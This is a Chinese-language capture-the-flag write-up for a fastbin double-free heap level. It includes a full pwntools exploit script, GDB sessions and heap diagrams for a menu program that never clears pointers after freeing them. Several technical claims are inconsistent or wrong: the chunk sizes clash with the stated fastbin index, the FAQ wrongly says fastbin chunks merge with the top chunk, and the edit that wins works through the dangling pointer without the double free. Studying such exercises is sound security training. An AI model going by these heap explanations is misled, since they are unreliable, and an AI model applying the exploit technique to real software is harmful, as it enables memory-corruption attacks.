# Level 3: Fastbin Double Free - 详细解题步骤

## 目标

控制 `chunks[0]` 的前 8 字节为 `0x4141414141414141`。

## 漏洞分析

### 程序功能

程序提供以下操作：
1. **Alloc**: 分配 chunk (size < 128)
2. **Free**: 释放 chunk
3. **Edit**: 编辑 chunk 内容
4. **Print**: 打印 chunk 内容
5. **Check**: 检查胜利条件
6. **Exit**: 退出

### 漏洞点

```c
case 2:
    printf("Index: ");
    scanf("%d", &idx);
    if (idx >= 0 && idx < count) {
        free(chunks[idx]);
        printf("Freed chunk %d\n", idx);
        // 漏洞：没有清空指针！
    }
    break;
```

**关键问题**：`free(chunks[idx])` 后，`chunks[idx]` 仍然指向原来的地址。

## 攻击思路

### Fastbin Double Free 漏洞利用原理

1. **Double Free**: 对同一 chunk free 两次
2. **循环链表**: 在 fastbin 中创建循环引用
3. **重复分配**: 多次分配到同一地址
4. **内容控制**: 通过 edit 修改内容

### 详细步骤

#### 步骤 1: 分配 3 个 Chunk

```python
# 从 pwn 导入所需模块
from pwn import *

# 启动进程
p = process('./vuln')

# 定义交互函数
def alloc(size):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'Size: ', str(size).encode())

def free(idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'Index: ', str(idx).encode())

def edit(idx, data):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'Index: ', str(idx).encode())
    p.sendafter(b'Data: ', data)

# 分配 3 个 chunk，每个 32 字节
alloc(32)   # index 0 - chunk A
alloc(32)   # index 1 - chunk B (防止与 top chunk 合并)
alloc(32)   # index 2 - chunk C
```

**堆布局**：
```
+---------------+
| Chunk A (32)  | ← index 0
+---------------+
| Chunk B (32)  | ← index 1
+---------------+
| Chunk C (32)  | ← index 2
+---------------+
| Top Chunk     |
+---------------+
```

#### 步骤 2: 创建 Double Free

```python
free(0)     # free chunk A
free(2)     # free chunk C
free(0)     # double free chunk A! ← 漏洞触发点
```

**Fastbin 状态变化**：

```
初始状态：
fastbin[0x20] → NULL

free(0) 后：
fastbin[0x20] → Chunk A → NULL

free(2) 后：
fastbin[0x20] → Chunk C → Chunk A → NULL

free(0) 后 (double free!)：
fastbin[0x20] → Chunk A → Chunk C → Chunk A → NULL
                  └────────────────────┘
                         循环!
```

**为什么不会触发检测**？
- glibc 检测：`if (chunk == fastbin(idx)->fd)`
- 当前链表头是 A，但 A->fd 是 C
- A ≠ C，检测通过！

#### 步骤 3: 重新分配 Chunk A

```python
alloc(32)   # 从 fastbin 取出 Chunk A，index 3
```

**Fastbin 状态**：
```
malloc 前：
fastbin[0x20] → A → C → A → NULL
                  ↑
                返回 A

malloc 后：
fastbin[0x20] → C → A → NULL

新的分配：
index 3 → Chunk A 的地址
```

**关键点**：
- `chunks[0]` 仍然指向 Chunk A 的地址
- `chunks[3]` 也指向 Chunk A 的地址
- 现在有两个指针指向同一块内存！

#### 步骤 4: 编辑 Chunk A

```python
# 通过 chunks[0] 编辑 Chunk A
# 注意：edit(0) 会修改 chunks[0] 指向的内存
# 也就是 Chunk A 的内容

edit(0, p64(0x4141414141414141))
```

**内存变化**：
```
编辑前 Chunk A：
+----------------------------------+
| size (0x40) | user data (?)      |
+----------------------------------+

编辑后 Chunk A：
+----------------------------------+
| size (0x40) | 0x4141414141414141 |
+----------------------------------+
              ↑
         前 8 字节
```

#### 步骤 5: 检查胜利条件

```python
# 发送检查命令
p.sendlineafter(b'> ', b'5')

# 如果成功，会打印 flag
p.interactive()
```

**程序检查**：
```c
if (*(unsigned long*)chunks[0] == 0x4141414141414141) {
    winner();  // 打印 flag！
}
```

## 完整 Exploit 代码

```python
#!/usr/bin/env python3
from pwn import *

# 配置
context.log_level = 'info'
binary = './vuln'

# 连接
p = process(binary)
# 或远程：p = remote('host', 12345)

# 定义操作函数
def alloc(size):
    """分配指定大小的 chunk"""
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'Size: ', str(size).encode())

def free(idx):
    """释放指定索引的 chunk"""
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'Index: ', str(idx).encode())

def edit(idx, data):
    """编辑指定索引的 chunk"""
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'Index: ', str(idx).encode())
    p.sendafter(b'Data: ', data)

def check():
    """检查胜利条件"""
    p.sendlineafter(b'> ', b'5')

# ========== Exploit ==========

log.info("步骤 1: 分配 3 个 chunk")
alloc(32)   # [0] chunk A
alloc(32)   # [1] chunk B
alloc(32)   # [2] chunk C

log.info("步骤 2: 创建 double free")
free(0)     # free A
free(2)     # free C
free(0)     # double free A!

log.info("步骤 3: 重新分配 chunk A")
alloc(32)   # [3] 拿回 A

log.info("步骤 4: 编辑 chunk A 为目标值")
edit(0, p64(0x4141414141414141))

log.info("步骤 5: 检查胜利条件")
check()

# 交互
p.interactive()
```

## GDB 调试过程

### 准备工作

```bash
# 编译（如果需要）
cd challenge
make

# 使用 GDB 启动
gdb ./vuln
```

### 调试步骤

#### 1. 第一次分配后

```
(gdb) b *main+XXX  # 在 alloc 后断点
(gdb) run
> 1
> 32

(gdb) heap
Allocated chunk | PREV_INUSE
Addr: 0x555555559000
Size: 0x41

(gdb) fastbin
fastbins[idx=0, size=0x20]
0x00 (空)
```

#### 2. Double Free 后

```
> 2
> 0    # free A

> 2
> 2    # free C

> 2
> 0    # double free A!

(gdb) fastbin
fastbins[idx=0, size=0x20]
  0x555555559000  ← A
  0x5555555590a0  ← C
  0x555555559000  ← A (重复!)
```

#### 3. 重新分配后

```
> 1
> 32

(gdb) x/gx 0x555555559000
0x555555559000: 0x0000000000000000

> 3
> 0
> AAAAAAAA  # 8 个 'A'

(gdb) x/gx 0x555555559000
0x555555559000: 0x4141414141414141  ← 成功!
```

## 内存布局图解

### 初始状态

```
chunks 数组：
+-------+----------------+
| index | address        |
+-------+----------------+
|   0   | 0x555...000    | ← Chunk A
|   1   | 0x555...050    | ← Chunk B
|   2   | 0x555...0a0    | ← Chunk C
+-------+----------------+

堆内存：
0x555...000: [ Chunk A: 32 bytes ]
0x555...050: [ Chunk B: 32 bytes ]
0x555...0a0: [ Chunk C: 32 bytes ]
0x555...0f0: [ Top Chunk ]
```

### Double Free 后

```
Fastbin 链表：
fastbin[0x20] → 0x555...000 → 0x555...0a0 → 0x555...000 (循环)
                               ↑
                            返回此地址
```

### 重新分配后

```
chunks 数组：
+-------+----------------+
| index | address        |
+-------+----------------+
|   0   | 0x555...000    | ← Chunk A (两个指针!)
|   1   | 0x555...050    | ← Chunk B
|   2   | 0x555...0a0    | ← Chunk C
|   3   | 0x555...000    | ← Chunk A (重复!)
+-------+----------------+
```

## 常见问题解答

### Q1: 为什么需要 3 个 chunk？

**A**: 为了绕过 double free 检测：
- 只用 1 个：连续 free 会触发检测
- 用 2 个：free(0), free(0) 会被检测
- 用 3 个：free(0), free(2), free(0) 绕过检测

### Q2: chunk1 的作用是什么？

**A**: 防止与 top chunk 合并：
- 如果只有 chunk0 和 chunk2
- Free chunk0 后，可能与 top 合并
- Chunk1 起隔离作用

### Q3: 为什么用 32 字节？

**A**: 32 字节属于 fastbin 范围：
- 实际大小：32 + header = 40 (0x28)
- 对齐后：48 (0x30)
- Fastbin 最大：~80 字节

### Q4: 如果 size > 128 会怎样？

**A**: 进入 small/large bin：
- 不能使用 fastbin 攻击
- 需要其他技术 (如 unsafe_unlink)

## 总结

本关卡的核心知识点：

1. ✅ **Fastbin LIFO 机制**: 后进先出的单链表
2. ✅ **Double Free 漏洞**: 重复释放导致链表循环
3. ✅ **指针不置空**: free 后仍可访问原内存
4. ✅ **内容控制**: 通过重复分配操纵内存

**关键技巧**：
- 使用中间 chunk 绕过检测
- 理解 fastbin 链表操作
- 追踪指针引用关系

## 下一步

完成 Level 3 后，你可以：
- 进入 **Level 4**: 学习 Tcache Poisoning
- 或者深入研究 **fastbin_dup_into_stack** 技术
- 学习如何绕过 Safe Linking (glibc 2.32+)

## 参考资料

- [How2Heap: Fastbin Dup](https://github.com/shellphish/how2heap#glibc-fastbin-dup)
- [CTF Wiki: Fastbin Attack](https://ctf-wiki.org/pwn/linux/glibc-heap/fastbin_attack/)
- [glibc Malloc 源码](https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;hb=HEAD)
